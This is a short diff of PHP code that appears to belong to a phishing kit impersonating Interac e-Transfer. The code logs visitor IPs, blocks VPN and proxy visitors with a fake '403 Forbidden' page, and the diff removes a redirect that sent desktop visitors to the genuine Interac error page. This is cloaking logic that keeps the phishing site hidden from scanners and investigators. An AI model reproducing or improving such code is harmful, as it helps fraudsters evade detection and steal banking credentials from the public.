@@ -43,7 +43,7 @@ $v_ip = getUserIPs();
                 fwrite($click,"<tr><td><p class=\"text-danger\">$v_ip|VPN/Proxy</p></td></tr>");
                 fclose($click);
                 header('HTTP/1.0 403 Forbidden');
-                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>');
+                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
                 exit();
             }
         } else {
@@ -67,7 +67,7 @@ $v_ip = getUserIPs();
                 fwrite($click,"<tr><td><p class=\"text-danger\">$v_ip|VPN/Proxy</p></td></tr>");
                 fclose($click);
                 header('HTTP/1.0 403 Forbidden');
-                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>');
+                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
                 exit();
             }
 
